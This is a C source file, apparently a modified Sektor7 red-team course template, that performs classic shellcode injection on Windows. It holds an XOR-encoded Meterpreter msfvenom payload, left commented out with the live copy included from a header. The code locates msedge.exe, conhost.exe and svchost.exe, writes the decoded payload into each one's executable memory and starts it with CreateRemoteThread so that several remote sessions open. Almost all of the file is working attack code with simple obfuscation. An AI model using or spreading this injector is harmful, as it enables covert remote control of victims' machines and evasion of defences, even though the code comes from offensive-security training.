/*

 Red Team Operator course code template
 classic code injection

 author: reenz0h (twitter: @sektor7net)

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include "payload.h"

// meterpreter msfvenom shellcode - 64-bit
//unsigned char payload[] = { 0xe2, 0x9b, 0x63, 0xe2, 0x2b, 0x43, 0x1b, 0x55, 0x55, 0x55, 0xe2, 0x27, 0xaf, 0x45, 0x55, 0x55, 0x55, 0xe2, 0x11, 0x47, 0xb7, 0xb0, 0x8d, 0xbb, 0x18, 0xdb, 0xc6, 0xe2, 0x9b, 0xf2, 0x8d, 0xe2, 0x87, 0x52, 0x55, 0x55, 0x55, 0x48, 0x5e, 0xbb, 0xff, 0x33, 0x69, 0x4b, 0xf0, 0x17, 0xc6, 0x47, 0xb7, 0xf1, 0xdc, 0xfa, 0x48, 0x89, 0x97, 0x11, 0xff, 0x81, 0x5f, 0xde, 0x50, 0x50, 0x94, 0x27, 0xff, 0x3b, 0xdf, 0xa3, 0x50, 0x50, 0x94, 0x67, 0xff, 0xbf, 0x3a, 0xf1, 0x52, 0x93, 0x4d, 0x35, 0xe7, 0xfd, 0xbc, 0x72, 0x50, 0xea, 0x6, 0xeb, 0x8b, 0xd1, 0xf1, 0xb9, 0x34, 0xfb, 0x87, 0x86, 0x7e, 0xbd, 0xcc, 0xba, 0xd9, 0x39, 0x2b, 0x15, 0xff, 0x3b, 0xdf, 0x9b, 0x93, 0x99, 0xfa, 0xf, 0xb6, 0x60, 0xcc, 0xea, 0x7e, 0x5a, 0xbe, 0x5f, 0xbc, 0xb2, 0x82, 0x3e, 0x6a, 0xdb, 0xc6, 0x47, 0x3c, 0x30, 0x5, 0xbb, 0x18, 0xdb, 0x8e, 0xc2, 0x77, 0xc4, 0xea, 0xf3, 0x19, 0xb, 0x96, 0xcc, 0xff, 0xa8, 0xc9, 0x30, 0x58, 0xfb, 0x8f, 0x46, 0x67, 0x53, 0xdb, 0xf3, 0xe7, 0x12, 0x8b, 0x76, 0x7e, 0xf1, 0x6, 0x8f, 0x90, 0x93, 0xc7, 0x91, 0xff, 0x81, 0x4d, 0x17, 0x59, 0x1a, 0xf, 0x4a, 0xf6, 0xb1, 0x4c, 0x83, 0xf8, 0xae, 0x37, 0xb, 0xb4, 0xfc, 0xa9, 0xb3, 0x5d, 0xe2, 0x17, 0x32, 0x6f, 0xe8, 0xc9, 0x30, 0x58, 0xff, 0x8f, 0x46, 0x67, 0xd6, 0xcc, 0x30, 0x14, 0x93, 0x82, 0xcc, 0xf7, 0xac, 0xc4, 0xba, 0xc8, 0x9a, 0x4d, 0x43, 0x3f, 0xf8, 0x8c, 0x6b, 0x59, 0x83, 0x87, 0x1f, 0xe9, 0xe9, 0xd7, 0xfa, 0x40, 0x9a, 0x9f, 0x6, 0xed, 0xf8, 0xe, 0x57, 0x38, 0x9a, 0x94, 0xb8, 0x57, 0xe8, 0xcc, 0xe2, 0x42, 0x93, 0x4d, 0x55, 0x5e, 0xfb, 0x72, 0x44, 0xe7, 0x86, 0x8e, 0x76, 0x6c, 0xe3, 0xc4, 0x5, 0x6f, 0xb2, 0xa8, 0x2e, 0xd9, 0xd5, 0xf9, 0xbb, 0x59, 0x8d, 0x8e, 0xce, 0x56, 0xf9, 0x4a, 0x79, 0x54, 0xac, 0xe0, 0x40, 0x48, 0x65, 0xde, 0xe8, 0x50, 0x52, 0x27, 0x14, 0xed, 0xfd, 0xbc, 0x7b, 0x55, 0xea, 0xf, 0x14, 0xe4, 0xf9, 0x37, 0x81, 0x4e, 0xa2, 0x61, 0x47, 0xb7, 0xb0, 0x8d, 0x44, 0xcd, 0x33, 0xd6, 0x47, 0xb7, 0xb0, 0xbc, 0x82, 0x2a, 0xf5, 0xf7, 0x71, 0x8f, 0x9e, 0xbc, 0x8c, 0x2b, 0xf5, 0xf7, 0x74, 0x87, 0xb0, 0xd7, 0xf3, 0x91, 0x1a, 0x8f, 0x80, 0x77, 0x99, 0xae, 0xbb, 0x18, 0x96, 0xf7, 0x8e, 0xe4, 0xe3, 0xe7, 0xb8, 0x4b, 0x92, 0x7c, 0x10, 0x3e, 0x2f, 0x4b, 0xbb, 0x18, 0xdb, 0xc6, 0xb8, 0x62, 0x58, 0xc1, 0xbb, 0x18, 0xdb, 0xe9, 0x4, 0xfb, 0xe8, 0xf7, 0xe4, 0x7e, 0x81, 0x92, 0x73, 0x85, 0xe2, 0xc5, 0xda, 0x28, 0x81, 0xb6, 0xe, 0xc7, 0x82, 0xfa, 0x8a, 0x7f, 0xf6, 0xb6, 0x20, 0xf0, 0xfe, 0xdd, 0xde, 0x55, 0xb0, 0xf1, 0x77, 0xc2, 0xc9, 0xc3, 0xef, 0x61, 0x8d, 0xb4, 0x35, 0x85, 0xe2, 0xc2, 0xdf, 0x79, 0xbe, 0xbf, 0x8, 0xd2, 0xea, 0xef, 0xf8, 0x4d, 0x99, 0xa0, 0x22, 0x81, 0xfa, 0xe3, 0xda, 0x42, 0xa3, 0xad, 0x3f, 0xfb, 0xca, 0xdb, 0xf4, 0x20, 0x94, 0x8c, 0x23, 0xe3, 0xb0, 0xc5, 0x32, 0xd9, 0x88, 0x9c, 0x6, 0xef, 0xfd, 0xbc, 0x72, 0x4b, 0x93, 0x7e, 0x47, 0x85, 0x18, 0x9, 0xbb, 0x18, 0xdb, 0xc6, 0x17, 0xe4, 0xe3, 0xc4, 0x7c, 0xda, 0x30, 0x93, 0x69, 0x8c, 0x4f, 0x58, 0xf3, 0x91, 0x1d, 0xac, 0x4d, 0xe8, 0xf8, 0x4, 0x4a, 0x72, 0xc4, 0x9c, 0x15, 0xdf, 0x30, 0xbe, 0xbb, 0x18, 0x92, 0x4f, 0xa7, 0xdd, 0xb4, 0xcc, 0xe2, 0x51, 0x61, 0xb3, 0x1, 0x29, 0x36, 0x8d, 0xbb, 0x18, 0xdb, 0x39, 0x92, 0xfa, 0x81, 0x4d, 0xe8, 0x42, 0x93, 0x4f, 0xb6, 0xfa, 0x81, 0x44, 0xf6, 0x29, 0x12, 0x95, 0x14, 0xfe, 0x77, 0x4f, 0x96, 0x1e, 0xc3, 0xbd, 0xb8, 0x62, 0x35, 0x4d, 0xce, 0x7, 0x93, 0x1, 0x86, 0x3f, 0xa3, 0x8d, 0xbb, 0x51, 0x61, 0x82, 0xb7, 0x82, 0x50, 0x8d, 0xbb, 0x18, 0xdb, 0x39, 0x92, 0xff, 0x4f, 0x42, 0xcf, 0x1a, 0x30, 0x6c, 0xaf, 0xe2, 0xb0, 0x8d, 0xbb, 0x4b, 0x82, 0xac, 0x7, 0xed, 0xf9, 0x4, 0x6a, 0xd9, 0x39, 0xd6, 0xe, 0x70, 0x70, 0x8d, 0xab, 0x18, 0xdb, 0x8f, 0xfd, 0xef, 0x14, 0xde, 0x5e, 0x18, 0xdb, 0xc6, 0x47, 0x48, 0x65, 0xc5, 0x28, 0x4b, 0x88, 0x8e, 0xce, 0x50, 0xf8, 0x4, 0x4a, 0x50, 0x52, 0x1c, 0xe, 0x70, 0x70, 0x8d, 0x9b, 0x18, 0xdb, 0x8f, 0xce, 0x4e, 0xf9, 0x37, 0xa9, 0x8e, 0x52, 0x24, 0x47, 0xb7, 0xb0, 0x8d, 0x44, 0xcd, 0x93, 0x45, 0x83, 0x97, 0x35, 0x4d, 0xcf, 0xaa, 0xbd, 0x4d, 0x40, 0xff, 0xb1, 0x4e, 0x3e, 0xd8, 0xae, 0x14, 0x1f, 0x74, 0xe8, 0xe7, 0xbb, 0x41, 0x92, 0x1, 0x85, 0x47, 0x5, 0x2f, 0xed, 0xe7, 0xe, 0xc6 };

//unsigned int payload_len = sizeof(payload); // Assuming you have your payload length defined correctly

void XOR(unsigned char* data, size_t data_len) {
    for (int i = 0; i < data_len; i++) {
        data[i] = data[i] ^ 0xAA;
    }
}

int FindTarget(const wchar_t* procname) { // Changed to wchar_t for Unicode

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpiW(procname, pe32.szExeFile) == 0) { // Changed to lstrcmpiW for Unicode
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);

    return pid;
}

int Inject(HANDLE hProc, unsigned char* payload, unsigned int payload_len) {

    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;

    pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE); // Ensure page is executable

    XOR(payload, payload_len);

    WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, NULL);

    // Properly casting pRemoteCode to LPTHREAD_START_ROUTINE
    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        return 0;
    }
    return -1;
}

int main(void) {

    int pid = 0;
    int pid2 = 0;
    int pid3 = 0;
    HANDLE hProc = NULL;

    pid = FindTarget(L"msedge.exe"); // adding 2 connexions - one with msedge.exe and conhost.exe to be sure that we have 2 connexions ! Changed to L"..." for Unicode
    pid2 = FindTarget(L"conhost.exe"); // adding 2 connexions - one with msedge.exe and conhost.exe to be sure that we have 2 connexions ! Changed to L"..." for Unicode
    pid3 = FindTarget(L"svchost.exe"); // adding 2 connexions - one with msedge.exe and conhost.exe to be sure that we have 2 connexions ! Changed to L"..." for Unicode

    if (pid) {
        wprintf(L"msedge.exe PID = %d\n", pid); // Use wprintf for Unicode

        hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
            FALSE, (DWORD)pid);

        if (hProc != NULL) {
            Inject(hProc, payload, payload_len);
            CloseHandle(hProc);
        }
        else {
            wprintf(L"There is a problem bro ...");
        }
    }

    if (pid2) {
        wprintf(L"conhost.exe PID = %d\n", pid2); // Use wprintf for Unicode

        hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
            FALSE, (DWORD)pid2);

        if (hProc != NULL) {
            Inject(hProc, payload, payload_len);
            CloseHandle(hProc);
        }
        else {
            wprintf(L"There is a problem bro ...");
        }
    }

    if (pid3) {
        wprintf(L"svchost.exe PID = %d\n", pid3); // Use wprintf for Unicode

        hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
            FALSE, (DWORD)pid3);

        if (hProc != NULL) {
            Inject(hProc, payload, payload_len);
            CloseHandle(hProc);
        }
        else {
            wprintf(L"There is a problem bro ...");
        }
    }
    return 0;
}
